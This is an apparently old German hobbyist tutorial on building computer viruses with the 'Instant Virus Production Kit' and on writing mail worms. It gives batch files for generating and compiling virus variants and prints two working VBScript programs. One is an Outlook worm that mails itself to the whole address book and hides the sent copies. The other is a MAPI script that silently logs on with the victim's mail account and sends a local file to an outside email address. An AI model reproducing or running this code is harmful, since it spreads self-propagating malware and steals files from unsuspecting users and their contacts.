Index:
        1. IVP 1.7
        2. Mail Wuermer



1. IVP 1.7

Achtung:
Dieser Artikel soll nicht dazu anleiten neue Viren 
zu kreieren oder andere gesetzeswiedrige Dinge zu 
begehen!! Ich will euch lediglich vermitteln, wie 
ein Virus funktioniert und wie leicht er produziert 
werden kann. Um Beschädigungen am eigenen Rechner 
auszuschließen, sollten sich nur erfahrene Anwender 
mit diesem Thema beschäftigen!

Die einfachste Art ein Virus zu "programmieren", 
ist über ein "virus production kit". Diese Kits 
sind leicht zu bedienen und führen schnell zu 
passablen Ergebnissen. Ein production kit enthält 
bereits eine Haupt-Virusroutine. Diese Routine dient 
als Grundlage und kann durch den Benutzer verändert 
werden. Damit entstehen zwar keine neuen Viren aber 
neue Virenversionen. Ein sehr gutes virus production 
kit, ist das "INSTANT VIRUS PRODUCTION KIT", auf das 
ich mich hier beziehe.

IVP besteht lediglich aus der "ivp.exe", die die 
Virusroutine enthält und eine Assembler-Datei kreiert. 
Diese Assembler-Datei wird mit einem "Turbo - 
Assembler" ("tasm.exe" und "tlink".exe) kompiliert. 
Um Tipparbeit zu ersparen, liegen dem Programm zwei 
Batch-Dateien bei: "asm.bat" und "comp.bat". 
"Asm.bat" dient dazu die Assembler-Datei des Virus 
zu erstellen. "Comp.bat" dient dazu diese 
Assembler-Datei zu kompilieren. Damit diese beiden 
Batch-Dateien funktionieren, muß erst das Verzeichnis 
eingetragen werden, indem sich die "ivp.exe" befindet 
(bei "asm.bat") und die Turbo - Assembler - Dateien 
(bei "comp.bat").

---------------
Asm.bat:

@echo off
c:\...\ivp ivp.cfg

---------------
Comp.bat:

@echo off
c:\...\tasm /m ivp
c:\...\tlink /t ivp
erase ivp.obj
erase ivp.map

---------------

Um den Virus nun mit allen seinen Optionen zu 
erstellen, muß die Datei "ivp.cfg" konfiguriert werden. 
Hier wird bestimmt wie und was das Virusprogramm später 
tun soll. Was genau eingestellt werden kann könnt ihr 
dem Word-Dokument "ivp.doc" entnehmen.

Je nach konfiguration kann der IVP-Virus sich einfach 
nur fortpflanzen, an einem bestimmten Datum den Computer 
abstürzen lassen, Dateien vergrößern ... Diese neue 
Virus-Version kann von Viren Programmen nur erkannt 
aber nicht entfernt werden – also ist Vorsicht 
geboten!!



******************************
------------------------------
2. Mail-Würmer ---------------
------------------------------

Würmer sind keine Viren im eigentlichen Sinn, da sie 
keine Programme als "Wirt" benötigen. Ihr Ziel ist daher 
nicht die Infizierung eines Computers, sondern die 
Fortpflanzung. Deshalb enthalten sie in den seltensten 
Fällen Schadensroutinen.
Ein Wurm verbreitet sich meistens über ein bestimmten 
Mail-Client, wie zum Beispiel: Microsoft Outlook. 
Erfahrungsgemäß kommt er als Anhang einer Mail, in 
Gestallt einer ausführbaren Datei (*.exe, *.vbs). Wurde 
ein Wurm einmal ausgeführt, versucht er sich fast immer 
mit Hilfe des Adressbuch selbst zu versenden. Im 
Adressbuch werden alle Mail-Kontakte, die ein User 
pflegt, automatisch archiviert. Daher enthält es eine 
Menge an E-Mail-Adressen, an die sich der Wurm dann 
schickt. Dadurch erhält man die "Wurm-Mail" natürlich 
von vertrauenswürdiger Quelle, was das verhängnisvolle 
Erfolgsrezept eines Mail-Wurms ist. Nach der 
Initialzündung verbreitet sich ein Wurm dann gemäß dem 
Schneeballprinzip. So erreichten Würmer wie "Loveletter" 
oder "Melissa" durch ihre Effektivität traurige 
Berühmtheit.
Das Mail-Würmer heutzutage zu den häufigsten virulenten 
Erscheinungen gehören, ist vor allem der leichten 
Entwicklung eines Wurms zu verdanken. Mit Hilfe von 
VB-Script (mehr dazu: Windows Scripting Host) kann man 
zum Beispiel mit ein paar Zeilen Quellcode einem dem 
"Loveletter" ebenbürtigen Wurm kreieren.

------------------------------
2.1 Outlook Wurm -------------
------------------------------

Mail Client: Outlook 97/2000
Quellcode: VB-Script

Dieser Wurm basiert größtenteils auf dem Loveletter-Wurm, 
er enthält keine Schadensroutinen.

------------------------------
outlook.vbs:

Dim OA         ' Outlook-Haupt-Objekt
Dim AB         ' Outlook Adressbuch
Dim ENT        ' Adressbucheintrag
Dim Mail
Dim NO         ' Zahl der Einträge
Dim Add        ' Mail-Adresse

Set OA = CreateObject( "Outlook.Application" )
Set AB = OA.GetNameSpace( "MAPI" )

' Hauptobjekte werden festgelegt

For Each ENT In AB.AddressLists
Set MAIL = OA.CreateItem( 0 )

For NO = 1 To ENT.AddressEntries.Count
Set ADD = ENT.AddressEntries( NO )

If NO = 1 Then
MAIL.BCC = ADD.Address
Else
MAIL.BCC = MAIL.BCC & "; " & ADD.Address
End If
Next

' Einfügen der verschiedenen Ziel-Adressen in die E-Mail

MAIL.Subject = "Betreff"
MAIL.Body = "Text"
MAIL.Attachments.Add WScript.ScriptFullName
MAIL.DeleteAfterSubmit = True
MAIL.Send
Next

' Erstellen der Nachricht

------------------------------
2.2 MAPI Wurm ----------------
------------------------------

Mail Client: universell
Quellcode: VB-Script

Dieser Wurm basiert auf einer Mail-Client 
unabhängigen "Mail-Application" (MAPI) Bibliothek. 
Daher ist er unabhängig von dem verwendeten 
Mail-Programm. Der MAPI Wurm kann zum Beispiel dazu 
benutzt werden, bestimmte Dateien vom Ziel-Computer 
zu "stehlen", und ist daher kein archetypischer 
"Wurm".

------------------------------
mapi.vbs:

Dim MAPISession, MAPIMessages, Key1, RegValue

Set Shell = CreateObject("wscript.shell")
Key1 = "HKEY_CURRENT_USER\Software\Microsoft\
        Internet Account Manager\Accounts\
        00000001\Account Name"
RegValue = Shell.RegRead(Key1)

' Mail-Account wird ausgelesen

Set MAPISession = CreateObject("msMapi.mapisession")
Set MAPIMessages = CreateObject("msMapi.mapimessages")

' Hauptobjekte werden festgelegt

with MAPISession
.Username = Regvalue
.LogonUI = False
.SignOn
End With

With MAPIMessages
.SessionID = MAPISession.SessionID
.Compose
.MsgSubject = "Betreff"
.Msgnotetext = "Text"
.AttachmentPathname = "C:\geheim.txt" ' Jeweilige Ziel-Datei
.RecipDisplayName = "CWegener@T-Online.de"
' Mail-Adresse, an die Datei geschickt wird
.ResolveName
.Send
End With

' Erstellen und senden der Nachricht